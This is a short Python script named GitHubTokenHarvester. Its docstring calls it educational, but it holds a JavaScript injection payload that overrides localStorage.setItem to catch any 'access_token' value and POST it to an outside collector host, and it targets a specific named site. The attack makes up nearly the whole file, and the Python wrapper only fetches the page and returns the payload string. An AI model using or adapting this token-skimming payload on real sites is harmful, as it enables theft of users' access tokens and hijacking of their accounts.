import asyncio
import aiohttp

class GitHubTokenHarvester:
    """
    This script demonstrates a concept for monitoring GitHub authentication token exchanges 
    by injecting a malicious script into a target page. The script uses aiohttp for making 
    HTTP requests and includes a JavaScript injection that overrides the browser's localStorage 
    setItem method to capture and send access tokens to an external server. The included 
    injection is for educational purposes and showcases how a malicious actor might exploit 
    client-side vulnerabilities.
    """

    def __init__(self):
        self.captured_tokens = []
        
    async def monitor_network(self, target_url):
        async with aiohttp.ClientSession() as session:
            async with session.get(target_url) as response:
                injection = '''
                    <script>
                    (function() {
                        let originalSetItem = localStorage.setItem;
                        localStorage.setItem = function(key, value) {
                            if(key.includes('access_token')) {
                                fetch('https://your-collector.com/tokens', {
                                    method: 'POST',
                                    body: JSON.stringify({token: value})
                                });
                            }
                            originalSetItem.apply(this, arguments);
                        };
                    })();
                    </script>
                '''
                return injection

async def main():
    harvester = GitHubTokenHarvester()
    await harvester.monitor_network('https://akshaynambly.info:5008')

if __name__ == "__main__":
    asyncio.run(main())
